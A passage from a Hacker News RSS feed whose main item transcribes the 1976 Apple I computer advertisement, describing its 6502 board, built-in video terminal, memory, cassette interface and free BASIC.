                    <a rel="nofollow" href="https://forkingmad.blog/blog/?q=WordPuzzles">#WordPuzzles</a>
                
            </p>
        

        
            


        

        
            
        
    


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple I Advertisement (1976) (253 pts)]]></title>
            <link>http://apple1.chez.com/Apple1project/Gallery/Gallery.htm</link>
            <guid>46847780</guid>
            <pubDate>Sun, 01 Feb 2026 17:36:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://apple1.chez.com/Apple1project/Gallery/Gallery.htm">http://apple1.chez.com/Apple1project/Gallery/Gallery.htm</a>, See on <a href="https://news.ycombinator.com/item?id=46847780">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> 
              <td> 
                <p><span color="#000000" size="+2">&nbsp;</span><span color="#000000">&nbsp;&nbsp;The 
                  Apple Computer. A truly complete microcomputer system on a single 
                  PC board. Based on the MOS Technology 6502 micro- processor, 
                  the Apple also has a built-in video terminal and sockets for 
                  8K bytes of onboard RAM memory. With the addition of a keyboard 
                  and video monitor, you'll have an extremely powerful computer 
                  system that can be used for anything from developing programs 
                  to playing games or running BASIC.<br>
                  &nbsp;&nbsp;&nbsp;Combining the computer, video terminal and 
                  dynamic memory on a single board has resulted in a large reduction 
                  in chip count, which means more reliability and lowered cost. 
                  Since the Apple comes fully assembled, tested &amp; burned-in 
                  and has a complete power supply on-board, initial set-up is 
                  essentially "hassle-free" and you can be running within 
                  minutes. At $666.66 (including 4K bytes RAM!) it opens many 
                  new possibilities for users and systems manufacturers.</span></p>
                <p><b><span color="#000000">You Don't Need an Expensive Teletype.<br>
                  </span></b><span color="#000000">Using the built-in video terminal 
                  and keyboard interface, you avoid all the expense, noise and 
                  mantenance associated with a teletype. And the Apple video terminal 
                  is six times faster than a teletype, which means more throughput 
                  and less waiting. The Apple connects directly to a video monitor 
                  (or home TV with an in- expensive RF modulator) and dis- plays 
                  960 easy to read characters in 24 rows of 40 characters per 
                  line with automatic scrolling. The video display section contains 
                  its own 1K bytes of memory, so all the RAM memory is available 
                  for user programs. And the</span> 
              </p></td>
              <td> 
                <p><span color="#000000">Keyboard Interface lets you use almost 
                  any ASCII-encoded keyboard.<br>
                  &nbsp;&nbsp;&nbsp;The Apple Computer makes it possible for many 
                  people with limited budgets to step up to a video terminal as 
                  an I/O device for their computer.</span></p>
                <p><b><span color="#000000">No More Switches,<br>
                  No MoreLights<br>
                  </span></b><span color="#000000">&nbsp;&nbsp;&nbsp;Compared 
                  to switches and LED's, a video terminal can dis- play vast amounts 
                  of information simultaneously. The Apple video terminal can 
                  display the contents of 192 memory locations at once on the 
                  screen. And the fimrware in PROMS enables you to enter,display 
                  and debug programs (all in hex) from the keyboard, ren- dering 
                  a front panel unnecessary. The firmware also allows your programs 
                  to print characters on the display, and since you'll be looking 
                  at letters and numbers instead of just LED's, the door is open 
                  to all kinds of alphanumeric software (i.e., Games and BASIC).</span></p>
                <p><b><span color="#000000">8K Bytes RAM in 16 Chips!</span></b><span color="#000000"><br>
                  The Apple Computer uses the new 16-pin 4K dynamic memory chips. 
                  They are faster and take 1/4 the space and power of even the 
                  low power 2102's (the memory chip that everyone else uses). 
                  That means 8K bytes in sixteen chips. It also means no more 
                  28 amp power supplies. &nbsp;&nbsp;&nbsp;The system is fully 
                  expandable to 65K via an edge connector which carries both the 
                  address and data busses, power supplies and all timing signals. 
                  All dy- namic memory refreshing for both on and off-board memory 
                  is done automatically. Also, the Apple Computer can be upgraded 
                  to use the 16K chips when they become availa-</span> 
              </p></td>
              <td> 
                <p><span color="#000000">ble. That's 32K bytes on-board RAM in 
                  16 IC's --the equivalent of 256 2102's!</span></p>
                <p><strong><span color="#000000">A little Cassette Board that 
                  Works!<br>
                  </span></strong><span color="#000000">Unlike many other cassette 
                  boards on the marketplace,ours works every timeIt plugs directly 
                  into the upright connector on the mainboard and stands only 
                  2" tall.And since it is very fast (1500 bits per second), 
                  you can read or write 4 K bytes in about 20 seconds.All timing 
                  is done in software, witch results in crystal-controlled accuracy 
                  and uniformity from unit to unit.<br>
                  unlike some other cassette interfaces witch requires an expensive 
                  tape recorder, the Apple Cassette Interface works reliably with 
                  almost any audio-grade cassette recorder.</span></p>
                <p><strong><span color="#000000">Softwares<br>
                  </span></strong><span color="#000000">A tape of APPLE BASIC 
                  is inclued free with the Cassette Interface.Apple Basic features 
                  immediate error message and fast execution, and let's you program 
                  in a highter level language immediately and without added cost.Also 
                  avialable now are a dis-assembler and many games, with many 
                  software packages,(including a macro assembler) in the works.And 
                  since our philosophy is to provide software for our machines 
                  free or at minimal cost, you won't be continually paying for 
                  access to this growing software library.<br>
                  The Apple Computer is in stock al almost all major computer 
                  stores.(if your local computer store doesn't carry our products, 
                  encourage them or write us direct).Dealer inquiries invited.</span> 
              </p></td>
            </div></div>]]></description>
        </item>
    </channel>
</rss>